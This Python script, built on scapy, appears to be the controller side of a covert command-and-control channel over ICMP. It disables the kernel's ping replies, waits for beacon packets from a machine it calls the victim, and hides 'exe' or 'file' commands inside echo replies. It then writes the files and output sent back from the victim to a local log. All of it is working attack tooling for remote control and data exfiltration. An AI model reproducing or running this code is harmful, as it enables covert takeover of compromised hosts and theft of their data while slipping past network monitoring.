from enum import Enum
from scapy.all import *
from scapy.layers.inet import *
import os
import sys
import time

BEACON = 60417
ANSWER = 60418
DONE = 60419
request_sent_to_victim = 0

# change settings so the kernel will ignore ICMP packets and let us handle them.
def ignoreICMP2():
    try:
        f = open("/proc/sys/net/ipv4/icmp_echo_ignore_all", "w+")
        contents = f.read()
        if contents[0] != "1":
            os.system('echo "1" > /proc/sys/net/ipv4/icmp_echo_ignore_all')
        f.close()
    except:
        print("[!] You need to run this tool with administrator privileges.")
        sys.exit()

def waitforvictim(command_type, command_param,file_path):
    global request_sent_to_victim
    request_sent_to_victim = 0
    ignoreICMP2()
    sniff(prn=lambda packet: perform_command(packet,command_type, command_param, file_path) , stop_filter=stop_sniff, filter="icmp", store=False)
    # UnIgnoreICMP()

def stop_sniff(pkt):
    if "victimdone" in str(pkt[3].load) or pkt[0][ICMP].id == DONE: #when the data in the packet contains "victimdone" or the id of the IP is "DONE"
        return True
    else:
        return False

def perform_command(pkt, command_type, command_param, file_path):
    victim_ip = pkt[0][IP].src
    send_string = command_type + ";" + command_param

    # if id = beacon, and command not yet sent - send command in icmp reply
    if pkt[0][ICMP].id == BEACON and globals()["request_sent_to_victim"] == 0:
        time.sleep(1)
        send(IP(dst=victim_ip) / ICMP(id=BEACON, type="echo-reply") / send_string)
        global request_sent_to_victim
        request_sent_to_victim = 1
    # if id = answer (the answer from victim to our command)- write the message to file
    elif pkt[0][ICMP].id == ANSWER:
        with open(file_path, 'a') as my_file:
            my_file.write(str(pkt[3].load))

    elif pkt[0][ICMP].id == DONE:
        with open(file_path, 'a') as my_file:
            my_file.write(str(pkt[3].load))


def c2_driver(file_path):
    # waitforvictim("exe", "/home/shlomi/test.out", file_path)
    waitforvictim("file", "/home/shlomi/bola.txt", file_path)

c2_driver("/home/shlomi/Desktop/message.txt")



